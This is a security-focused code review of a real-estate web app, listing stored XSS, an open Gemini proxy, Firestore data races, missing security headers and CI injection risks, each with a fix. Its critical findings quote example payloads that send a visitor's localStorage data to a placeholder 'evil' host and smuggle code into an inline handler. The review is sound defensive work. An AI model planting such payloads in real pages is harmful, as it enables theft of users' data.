# Local Code Review — Darna Immo

**Reviewed**: 2026-10-24
**Scope**: whole working tree (directory is **not** a git repository → no diff available; full-codebase review)
**Decision**: **BLOCK** — 3 CRITICAL, 9 HIGH

## Summary
Static real-estate PWA (vanilla JS + Firebase/Firestore + Leaflet, Netlify Function for Gemini).
The functional design is coherent, but the trust model is inverted: an unauthenticated public
Firestore collection is rendered into `innerHTML` on every page, and a public CORS-open Gemini
proxy sits in front of a billable API key. Both are exploitable today with a single crafted ad.

---

## CRITICAL

### C1 — Stored XSS via ad comments (`app.js:759-767`)
`loadComments()` writes user-controlled strings straight into `innerHTML`:
```js
list.innerHTML = [...comments].reverse().map(c=>`
  ... <span class="comment-author">👤 ${c.name||'مجهول'}</span>
      <div class="comment-text">${c.text}</div>`).join('');
```
`submitComment()` (`app.js:772-787`) stores `text`/`name` verbatim. Any visitor posting
`<img src=x onerror=fetch('//evil/'+localStorage.x)>` executes on every viewer of that ad.
**Fix**: build nodes with `textContent`, or escape via `map.js`'s `esc()` helper.

### C2 — Stored XSS via ad fields in inline handlers (`app.js:403, 423, 426`)
```js
<div class="card" ... onclick="openD('${ad.id}')">
<button ... onclick="...openWA('${safePhone}','${safeTitle}')">
<button ... onclick="...dial('${ad.phone||''}')">
```
`safePhone`/`safeTitle` (`app.js:397-398`) are **HTML**-escaped (`&#39;`) — entities are decoded
before the attribute text is compiled as JS, so the escaping does not protect the JS string
context. `ad.phone` at line 426 is not escaped at all, and `sub()` (`app.js:879-889`) accepts any
value containing 9–13 digits, e.g. `963123456');fetch('//evil');//`.
**Fix**: drop inline handlers; use `addEventListener` + `dataset.id`, resolve the ad from `DATA`.
At minimum, `JSON.stringify()` the value *and* HTML-escape the result.

### C3 — Unauthenticated, CORS-open Gemini proxy (`netlify/functions/generate-desc.js:9, 30-40`)
`Access-Control-Allow-Origin: *`, no auth, no rate limit, no origin check, key in the query
string (`?key=${GEMINI_KEY}`, logged by any intermediary/proxy). Anyone can burn the Gemini quota
from any site. `catch` returns `err.message` to the client (`:62`).
**Fix**: allowlist the production origin, require a session/anon token, add per-IP rate limiting
(Netlify edge or a KV counter), send the key in `x-goog-api-key`, return a generic error body.

---

## HIGH

### H1 — Ad images stored as base64 inside Firestore documents (`app.js:910, 1841`)
Limit is 2 MB → base64 ≈ 2.7 MB, over Firestore's **1 MiB per-document** cap, so the publish
silently fails for exactly the photos users care about. Even when it fits, `startFirebaseListener`
(`app.js:1282`) subscribes to **all** documents, so every visitor downloads every image.
**Fix**: compress client-side to ≤ 300 KB (canvas/`createImageBitmap`), or upload to Firebase
Storage and store a URL.

### H2 — Read-modify-write on arrays loses data (`app.js:733-739, 779-782`)
`getDoc` → `[...existing, item]` → `setDoc(...,{merge:true})`. Two concurrent comments/ratings
overwrite each other; arrays also grow unbounded toward the 1 MiB cap.
**Fix**: subcollections (`comments/{adId}/items`) + `arrayUnion`/`serverTimestamp`.

### H3 — Anyone can rewrite aggregate counters (`app.js:667, 739`)
`views` is incremented by every client (race, inflatable), and `avgRating`/`ratingCount` are
written by the client from a locally computed array — a direct Firestore write can set any rating.
**Fix**: derive aggregates in a Cloud Function / `onWrite` trigger, or compute on read.

### H4 — No security headers anywhere (no `netlify.toml`, no `_headers`)
No CSP, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, or HSTS. With third-party scripts
(Meta Pixel, Firebase, Leaflet, Google Fonts) and C1/C2 present, a CSP would be the last line of
defence; there is none.
**Fix**: add `netlify.toml` with a strict `Content-Security-Policy` (start in report-only).

### H5 — Duplicate, stale function copy with a real bug (`generate-desc.js` at repo root)
The root copy runs the `httpMethod !== 'POST'` check *before* `OPTIONS` (`:4-6`), so every browser
preflight gets 405; the `netlify/functions/` copy fixed this ordering. Two files, same header
comment, divergent behaviour — guaranteed confusion. Delete the root copy.

### H6 — CI injects PR diff into JSON and shell (`claude-review.yml:17, 33`)
`git diff HEAD~1` goes into `$GITHUB_ENV` and then into a `-d "{...${DIFF}...}"` string: a diff
containing `"` or backticks breaks the request or injects shell. The diff is also attacker-authored
content passed straight to the model (prompt injection). Actions are pinned to old majors
(`checkout@v3`, `codeql-action@v2`). Model id `claude-sonnet-4-6` is not a current model.
**Fix**: pass the diff via `jq -Rs`/`--data @file`, never interpolate into `-d`; bump actions.

### H7 — `applyTranslation()` is not null-safe and runs at import (`app.js:1666-1682`)
`document.querySelector('.pmhead-title').textContent = ...` (and `#pt`/`#po` option loops) throw
if the element is absent, aborting translation *and* the trailing `sortAndRender()`. This already
bit the codebase before (every other access in the same function uses `if (el)`).
**Fix**: guard every lookup, or early-return per section.

### H8 — Search/filter scanning is recomputed per keystroke over the full set (`app.js:284-300`)
`adMatches` recomputes `normalizeText` + `phoneticFingerprint` + `levenshteinDistance` for
every ad × every word on each `applyFilters()`. With the full collection loaded (H1) this is
O(ads × words × len²) on the main thread. No debounce on `#Q`.
**Fix**: precompute per-ad fingerprints once on load; debounce input ~250 ms.

### H9 — Service worker install is all-or-nothing (`sw.js:20-25`)
`cache.addAll(STATIC_ASSETS)` rejects if *any* asset fails (including the Google Fonts URL), so a
single 404 or a flaky CDN leaves the site permanently uncached — silently, since the failure only
appears in the console. The `fetch` handler also caches every GET it sees.
**Fix**: `Promise.allSettled` per asset; allowlist cacheable paths.

---

## MEDIUM

- **M1** `app.js:590, 616-621` — `mtt`/`mbg`/`mds` use `innerHTML` with ad data (part of C2);
  even with C2 fixed, `desc` should be `textContent` with CSS `white-space: pre-line`.
- **M2** `app.js:1548-1549, 1565` — `el.querySelector('span').textContent` without checking the
  `span` exists.
- **M3** No tests at all; `app.js` is 1969 lines (checklist HIGH threshold: 800) and mixes i18n
  data, search engine, rendering, and Firestore I/O.
- **M4** `index.html:45` — `maximum-scale=1.0, user-scalable=no` fails WCAG 1.4.4.
- **M5** Rating stars are `<span>`s with mouse-only handlers (`app.js:675-694`); the detail modal
  has no `aria-modal`, no focus trap, and no Escape handler. `#dm`/`#pm` are plain divs.
- **M6** Meta Pixel fires `PageView`/`Contact`/`` with no consent gate and the privacy page
  does not mention Facebook.
- **M7** `manifest.json:13` — `"dir": "rtl"` with `"lang": "fr-DZ"`; the FR UI is forced RTL
  (`LANG.fr.dir = 'rtl'` is defined but never applied — and is itself wrong).
- **M8** `app.js:1966` — `console.log` of SW registration left in production.
- **M9** Firebase web config hardcoded (`app.js:4-11`) — public by design, but it means Firestore
  security rules are the *only* boundary; no `firestore.rules` exists in the repo.

## LOW
- Emoji used inside comments and JS string literals throughout (project style; flagged by the
  checklist, no action unless the team wants it).
- `copyAdLink()` (`app.js:790`) builds `location.origin + location.pathname + '#ad-' + id`; the
  hash is never read on load, so shared links don't deep-link.
- `map.js:398` — `openWA(ad.phone || '', ...)` will open `wa.me/213` for ads without a phone.
- No `.gitignore`-tracked repo: the whole project was delivered without version control.

---

## Validation Results

| Check | Result |
|---|---|
| Type check | Skipped (no `tsconfig`, plain JS) |
| Lint | Skipped (no lint config, no `package.json`) |
| Tests | Skipped (none exist) |
| Build | Skipped (static site, no build step) |

## Files Reviewed
- `app.js` (all 1969 lines), `map.js`, `fx.js`, `sw.js`, `communes.js` (head), `manifest.json`
- `index.html`, `listings.html`, `netlify/functions/generate-desc.js`, `generate-desc.js`
- `.github/workflows/codeql.yml`, `claude-review.yml`
- `styles.css`, `SECURITY.md`, `assets/README.md` (not read in depth — no logic)

## Minimum to unblock
1. C1 + C2 + C3.
2. Firestore rules committed to the repo and deployed (deny client writes to `ratings`/aggregates).
3. `netlify.toml` with CSP + framing headers.
4. H1 (image size/Storage) before any real traffic.
